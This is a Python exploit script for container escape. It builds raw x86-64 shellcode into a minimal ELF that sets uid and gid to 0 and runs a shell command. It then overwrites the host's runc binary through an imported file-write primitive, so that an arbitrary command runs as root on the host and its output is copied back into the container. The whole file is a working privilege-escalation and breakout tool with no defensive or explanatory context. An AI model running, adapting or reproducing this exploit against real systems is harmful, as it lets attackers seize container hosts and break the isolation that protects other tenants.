#!/usr/bin/env python3
import os
import shlex
import struct
import sys

from copyfail_primitive import copy_fail_fd


def round4(n):
    return (n + 3) & ~3


def elf_payload(cmd: str) -> bytes:
    code = bytearray()
    fixups = []

    def emit(b):
        code.extend(b)

    def lea(modrm, label):
        pos = len(code)
        emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
        fixups.append((pos + 3, label, pos + 7))

    emit(b"\x31\xff\x6a\x69\x58\x0f\x05")  # setuid(0)
    emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")  # setgid(0)
    lea(0x3D, "self_exe")
    emit(b"\x31\xf6\x31\xd2\x6a\x02\x58\x0f\x05")  # open("/proc/self/exe", O_RDONLY)
    emit(b"\x48\x89\xc7\x6a\x09\x5e\x6a\x21\x58\x0f\x05")  # dup2(fd, 9)
    lea(0x3D, "sh")
    lea(0x1D, "dash_c")
    lea(0x0D, "cmd")
    emit(b"\x31\xd2\x52\x51\x53\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")

    labels = {"sh": len(code)}
    emit(b"/bin/sh\0")
    labels["dash_c"] = len(code)
    emit(b"-c\0")
    labels["self_exe"] = len(code)
    emit(b"/proc/self/exe\0")
    labels["cmd"] = len(code)
    emit(cmd.encode() + b"\0")

    for at, label, next_ip in fixups:
        code[at : at + 4] = struct.pack("<i", labels[label] - next_ip)

    off = 0x78
    size = off + len(code)
    eh = bytearray(0x40)
    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into("<HHIQQQIHHHHHH", eh, 16, 2, 0x3E, 1, 0x400000 + off, 0x40, 0, 0, 0x40, 0x38, 1, 0, 0, 0)
    ph = bytearray(0x38)
    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
    return bytes(eh + ph + code)

if len(sys.argv) < 5:
    raise SystemExit(f"usage: {sys.argv[0]} RUNC_FD CONTAINER_OUT MARKER_PATH MARKER_TOKEN [host-command [args...]]")

runc_fd_path = sys.argv[1]
out = sys.argv[2]
marker = sys.argv[3]
token = sys.argv[4]
argv = sys.argv[5:]
work = os.path.dirname(os.path.abspath(out))
backup = os.path.join(work, "runc.orig")
helper = os.path.abspath(os.environ.get("DCF_COPYFAIL_HELPER", os.path.join(work, "copyfail_write")))
try:
    runc_target = os.readlink(runc_fd_path).removesuffix(" (deleted)")
except OSError:
    runc_target = "/runc"
if not runc_target.startswith("/"):
    raise SystemExit(f"unexpected non-absolute runc path: {runc_target}")

if argv:
    host_command = shlex.join(argv)
else:
    host_command = "hostname"

qout = shlex.quote(out)
qmarker = shlex.quote(marker)
qtoken = shlex.quote(token)
qbackup = shlex.quote(backup)
qhelper = shlex.quote(helper)
qtarget = shlex.quote(runc_target)
cmd = (
    f"c_out={qout}; "
    f"c_marker={qmarker}; "
    f"c_token={qtoken}; "
    f"c_backup={qbackup}; "
    f"c_helper={qhelper}; "
    f"c_target={qtarget}; "
    f"root=; "
    f"out=; "
    f"for r in /proc/[0-9]*/root; do "
    f"if [ -r \"$r$c_marker\" ] && [ \"$(cat \"$r$c_marker\" 2>/dev/null)\" = \"$c_token\" ]; then "
    f"root=\"$r\"; out=\"$r$c_out\"; break; "
    f"fi; "
    f"done; "
    f"[ -n \"$root\" ] || exit 111; "
    f"rm -f \"$out\" \"$out.done\"; "
    f"restore_log=\"$out.restore\"; "
    f"runc_fd=\"/proc/$$/fd/9\"; "
    f"if [ ! -r \"$runc_fd\" ] && [ -r \"$c_target\" ]; then runc_fd=\"$c_target\"; fi; "
    f"\"$root$c_helper\" \"$runc_fd\" 0 \"$root$c_backup\" > \"$restore_log\" 2>&1; "
    f"restore_rc=$?; "
    f"cat \"$restore_log\" >> \"$out\" 2>/dev/null; "
    f"rm -f \"$restore_log\"; "
    f"printf '[restore=%d]\\n' \"$restore_rc\" >> \"$out\"; "
    f"if [ \"$restore_rc\" -eq 0 ]; then "
    f"( {host_command} ) >> \"$out\" 2>&1; "
    f"rc=$?; "
    f"else rc=\"$restore_rc\"; fi; "
    f"printf '\\n[exit=%d]\\n' \"$rc\" >> \"$out\"; "
    f"chmod 644 \"$out\"; "
    f"printf '%s\\n' \"$rc\" > \"$out.done\"; "
    f"chmod 644 \"$out.done\""
)
payload = elf_payload(cmd)
backup_len = round4(len(payload))
fd = os.open(runc_fd_path, os.O_RDONLY)
try:
    original = os.pread(fd, backup_len, 0)
    if len(original) != backup_len:
        raise SystemExit(f"short read while backing up runc: got {len(original)} want {backup_len}")
    with open(backup, "wb") as f:
        f.write(original)
    os.chmod(backup, 0o644)
    print(
        f"patching {runc_fd_path} target={runc_target} payload={len(payload)} backup={backup_len} "
        f"out=/proc/*/root{out} command={host_command}",
        flush=True,
    )
    copy_fail_fd(fd, payload)
finally:
    os.close(fd)
print("done", flush=True)
